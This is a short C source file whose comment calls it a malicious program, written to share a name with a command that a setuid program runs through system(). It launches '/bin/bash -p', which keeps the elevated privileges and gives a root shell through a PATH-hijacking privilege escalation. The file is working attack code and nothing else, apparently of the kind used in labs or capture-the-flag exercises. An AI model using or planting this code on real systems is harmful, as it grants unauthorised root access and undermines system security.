/* Malicious program with the same name as the passed to system() inside the setuid program */

#include<stdlib.h>
void main(){
	system("/bin/bash -p");
}
